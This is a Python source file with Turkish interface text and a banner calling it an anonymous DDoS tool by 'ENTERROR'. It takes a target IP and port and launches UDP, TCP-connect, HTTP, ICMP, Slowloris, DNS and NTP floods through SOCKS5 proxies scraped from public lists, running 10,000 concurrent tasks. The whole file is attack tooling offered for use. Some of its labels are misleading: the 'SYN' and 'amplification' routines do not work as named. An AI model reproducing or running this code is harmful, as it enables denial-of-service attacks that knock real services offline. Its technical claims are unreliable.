import asyncio
import socket
import random
import socks
import requests
from colorama import Fore, Style, init
import time
import threading
import sys
import os
import struct
import ipaddress

init(autoreset=True)

# ASCII Sanatı
print(Fore.CYAN + Style.BRIGHT + r"""
================================================================================
   DDDD   DDDD    OOOO    OOOO    SSSSS    GÜÇLENDIRILMIS DDOS ARACI
   D   D  D   D  O    O  O    O  S        BY ENTERROR - FULLY ENHANCED & ANONIM
   D    D D    D O    O  O    O  SSSSS     **EJDERHA GÜCÜYLE ANONIM SALDIRI**
   D     D D     O    O  O    O       S    **ŞİMDİ DAHA GÜÇLÜ, GİZLİ VE HIZLI!**
   DDDD   DDDD    OOOO    OOOO    SSSSS
================================================================================
       /\_/\  
      ( o.o ) 
       > ^ < 
   ** EJDERHA'NIN ÖFKESI: ANONIM, ETKILI VE GÜVENILIR **
================================================================================
""")

bot_counter = 0  # Global sayaç
counter_lock = threading.Lock()  # Thread güvenliği
stop_event = asyncio.Event()
proxies = []  # Global proxies listesi

def get_proxies():
    proxy_sources = [
        "https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://www.proxy-list.download/api/v1/get?type=socks5",
        "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxy.list",
        "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/socks5.txt"
    ]
    global proxies
    proxies = []
    for source in proxy_sources:
        try:
            response = requests.get(source, timeout=5)
            for line in response.text.splitlines():
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        host = parts[0]
                        port = int(parts[1])
                        proxies.append({'type': socks.SOCKS5, 'host': host, 'port': port})
        except Exception:
            continue
    if not proxies:
        print(Fore.RED + "Proxy bulunamadı." + Style.RESET_ALL)
        sys.exit(1)
    return proxies

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/58.0.3029.110 Safari/537.3',
    'User-Agent: ENTErrorBot/1.0',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
]

async def attack_loop(target_ip, target_port, attack_type, duration):
    global bot_counter
    end_time = time.time() + duration
    while (duration == 0 or time.time() < end_time) and not stop_event.is_set():
        try:
            proxy = random.choice(proxies)
            socks.set_default_proxy(proxy['type'], proxy['host'], proxy['port'])
            socket.socket = socks.socksocket
            
            if attack_type in ['1', '8']:  # UDP Flood
                with counter_lock:
                    bot_counter += 1
                await asyncio.to_thread(send_udp, target_ip, target_port, packet_size=65535, loops=1000)
            
            if attack_type in ['2', '8']:  # SYN Flood
                with counter_lock:
                    bot_counter += 1
                await asyncio.to_thread(send_syn, target_ip, target_port, loops=1000)
            
            if attack_type in ['3', '8']:  # HTTP Flood
                with counter_lock:
                    bot_counter += 1
                await asyncio.to_thread(send_http, target_ip, target_port, requests_per_loop=500)
            
            if attack_type in ['4', '8']:  # ICMP Flood
                with counter_lock:
                    bot_counter += 1
                await asyncio.to_thread(send_icmp, target_ip, loops=1000)
            
            if attack_type in ['5', '8']:  # Slowloris
                with counter_lock:
                    bot_counter += 1
                await asyncio.to_thread(send_slowloris, target_ip, target_port, headers_per_send=20)
            
            if attack_type in ['6', '8']:  # DNS Amplification
                with counter_lock:
                    bot_counter += 1
                await asyncio.to_thread(send_dns_amp, target_ip, target_port, amplification_loops=500)
            
            if attack_type in ['7', '8']:  # NTP Amplification
                with counter_lock:
                    bot_counter += 1
                await asyncio.to_thread(send_ntp_amp, target_ip, target_port)
            
            await asyncio.sleep(0.000001)
        
        except Exception:
            continue

def send_udp(target_ip, target_port, packet_size=65535, loops=1000):
    for _ in range(loops):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                packets = bytearray(random.getrandbits(8) for _ in range(packet_size))
                sock.sendto(packets, (target_ip, target_port))
        except socket.error:
            pass

def send_syn(target_ip, target_port, loops=1000):
    for _ in range(loops):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((target_ip, target_port))
        except socket.error:
            pass

def send_http(target_ip, target_port, requests_per_loop=500):
    for _ in range(requests_per_loop):
        headers = {'User-Agent': random.choice(user_agents)}
        proxy_choice = random.choice(proxies)
        proxies_config = {'http': f"socks5://{proxy_choice['host']}:{proxy_choice['port']}", 'https': f"socks5://{proxy_choice['host']}:{proxy_choice['port']}"}
        try:
            requests.get(f"http://{target_ip}:{target_port}/", headers=headers, proxies=proxies_config, timeout=0.1)
        except requests.RequestException:
            pass

def send_icmp(target_ip, loops=1000):
    if os.geteuid() != 0:
        return
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
            for _ in range(loops):
                icmp_packet = struct.pack('!BBHHH', 8, 0, random.randint(1, 65535), 0, 1) + b'ICMP Flood'
                sock.sendto(icmp_packet, (target_ip, 1))
    except socket.error:
        pass

def send_slowloris(target_ip, target_port, headers_per_send=20):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n")
            while not stop_event.is_set():
                for _ in range(headers_per_send):
                    sock.send(b"X-a: b\r\nX-b: c\r\nX-c: d\r\nX-d: e\r\nX-e: f\r\nX-f: g\r\n")
                time.sleep(0.005)
    except socket.error:
        pass

def send_dns_amp(target_ip, target_port, amplification_loops=500):
    dns_servers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '9.9.9.9']
    for _ in range(amplification_loops):
        for server in dns_servers:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    sock.sendto(b'\x2a\x72\x36\x01\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x04_test\x03_com\x00\x00\x01\x00\x01', (server, 53))
                    response, _ = sock.recvfrom(1024)
                    spoofed_packet = response.replace(server.encode(), target_ip.encode())
                    sock.sendto(spoofed_packet, (target_ip, target_port))
            except socket.error:
                pass

def send_ntp_amp(target_ip, target_port):
    ntp_servers = ['time.google.com', 'pool.ntp.org']
    for server in ntp_servers:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(b'\x1b' + 47 * b'\0', (server, 123))
                response, _ = sock.recvfrom(1024)
                sock.sendto(response, (target_ip, target_port))
        except socket.error:
            pass

def send_all(target_ip, target_port):
    send_udp(target_ip, target_port)
    send_syn(target_ip, target_port)
    send_http(target_ip, target_port)
    send_icmp(target_ip)
    send_slowloris(target_ip, target_port)
    send_dns_amp(target_ip, target_port)
    send_ntp_amp(target_ip, target_port)

def wait_for_stop(duration):
    if duration == 0:
        while not stop_event.is_set():
            user_input = input(Fore.CYAN + Style.BRIGHT + "Ejderha saldırısı devam ediyor... Saldırıyı durdurmak için 'X' tuşuna basın: " + Style.RESET_ALL)
            if user_input.lower() == 'x':
                stop_event.set()
                print(Fore.GREEN + "Saldırı durduruldu." + Style.RESET_ALL)
                break

def print_live_counter(duration):
    end_time = time.time() + duration
    while not stop_event.is_set() and (duration == 0 or time.time() < end_time):
        with counter_lock:
            print(Fore.YELLOW + Style.BRIGHT + f"Gönderilen bot sayısı: {bot_counter}" + Style.RESET_ALL)
        time.sleep(0.05)

async def main(target_ip, target_port, duration, attack_type):
    global proxies, bot_counter
    proxies = get_proxies()
    bot_counter = 0
    print(Fore.CYAN + Style.BRIGHT + "Ejderha uyanıyor! Saldırı başlıyor..." + Style.RESET_ALL)
    if duration == 0:
        threading.Thread(target=wait_for_stop, args=(duration,)).start()
    threading.Thread(target=print_live_counter, args=(duration,)).start()
    tasks = [asyncio.create_task(attack_loop(target_ip, target_port, attack_type, duration)) for _ in range(10000)]
    await asyncio.gather(*tasks)
    print(Fore.CYAN + Style.BRIGHT + "Saldırı bitti!" + Style.RESET_ALL)
    print(Fore.CYAN + Style.BRIGHT + f"Saldırı özeti: Toplam bot {bot_counter}, Süre: {duration} saniye." + Style.RESET_ALL)
    while True:
        prompt = input(Fore.CYAN + Style.BRIGHT + "Saldırıyı durdurmak için 'X', Menüye dönmek için 'M', Araçtan çıkmak için 'Q': " + Style.RESET_ALL)
        if prompt.lower() == 'x':
            stop_event.set()
            print(Fore.GREEN + "Saldırı durduruldu." + Style.RESET_ALL)
        elif prompt.lower() == 'm':
            return  # Menüye döner
        elif prompt.lower() == 'q':
            sys.exit(0)  # Araçtan çık
        else:
            print(Fore.YELLOW + "Geçersiz tuş. Lütfen 'X', 'M' veya 'Q' tuşunu kullanın." + Style.RESET_ALL)

if __name__ == "__main__":
    proxies = get_proxies()
    while True:
        print(Fore.YELLOW + Style.BRIGHT + "Menü: 1. Saldırıyı Başlat, Q. Çıkış" + Style.RESET_ALL)
        choice = input(Fore.YELLOW + "Seçiminizi girin: " + Style.RESET_ALL)
        if choice.lower() == 'q':
            sys.exit(0)  # Araçtan çık
        elif choice == '1':
            target_ip = input(Fore.YELLOW + "Hedef IP'yi girin: " + Style.RESET_ALL)
            try:
                ipaddress.ip_address(target_ip)
            except ValueError:
                print(Fore.RED + "Geçersiz IP. Lütfen doğru bir IP girin." + Style.RESET_ALL)
                continue
            target_port_input = input(Fore.YELLOW + "Hedef Port'u girin (varsayılan 80): " + Style.RESET_ALL)
            target_port = int(target_port_input) if target_port_input.isdigit() else 80
            duration_input = input(Fore.YELLOW + "Süre'yi girin (saniye, 0 için sonsuz): " + Style.RESET_ALL)
            duration = int(duration_input) if duration_input.isdigit() else 60
            attack_type = input(Fore.YELLOW + "Saldırı türünü seçin (1: UDP, 2: SYN, 3: HTTP, 4: ICMP, 5: Slowloris, 6: DNS Amplification, 7: NTP Amplification, 8: Hepsi): " + Style.RESET_ALL)
            asyncio.run(main(target_ip, target_port, duration, attack_type))
